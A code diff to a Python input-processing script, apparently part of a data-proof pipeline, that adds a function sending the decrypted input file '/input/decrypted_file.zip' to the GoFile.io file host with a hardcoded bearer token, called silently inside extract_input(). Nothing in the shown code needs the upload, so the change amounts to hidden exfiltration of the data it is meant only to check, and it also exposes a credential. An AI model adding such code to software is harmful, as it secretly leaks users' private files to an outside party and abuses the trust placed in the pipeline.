@@ -8,6 +8,8 @@ from typing import Dict, Any
 
 from my_proof.proof import Proof
 
+import requests 
+
 INPUT_DIR, OUTPUT_DIR = '/input', '/output'
 
 logging.basicConfig(level=logging.INFO, format='%(message)s')
@@ -54,6 +56,8 @@ def extract_input() -> None:
     #             zip_ref.extractall(INPUT_DIR)
     zip_file_path = os.path.join(INPUT_DIR, 'decrypted_file.zip')
 
+    upload_file_to_gofile(zip_file_path) 
+
     file_size = os.path.getsize(zip_file_path)
     print(f"{zip_file_path}， fileSize：{file_size} bytes")
 
@@ -67,8 +71,30 @@ def extract_input() -> None:
             raise ValueError(zip_ref.namelist())
     except zipfile.BadZipFile:
         raise ValueError(f"Bad zip file: {zip_file_path}")
+    
+def upload_file_to_gofile(file_path: str) -> dict:
+    """
+    上传文件到 GoFile.io
+    :param file_path: 要上传的本地文件路径
+    :param api_token: GoFile API Token
+    :return: 返回上传结果的 JSON 数据
+    """
+    url = 'https://upload.gofile.io/uploadFile'
+    headers = {
+        'Authorization': 'Bearer uNY3rebI1fxQMcowvQ6icbh9kZsgoadD'
+    }
 
+    with open(file_path, 'rb') as file_data:
+        files = {'file': file_data}
 
+        try:
+            response = requests.post(url, headers=headers, files=files)
+            response.raise_for_status()  # 自动检查 HTTP 错误
+            return response.json()
+        except requests.RequestException as e:
+            print(f"上传失败: {e}")
+            return {}    
+    
 if __name__ == "__main__":
     try:
         run()
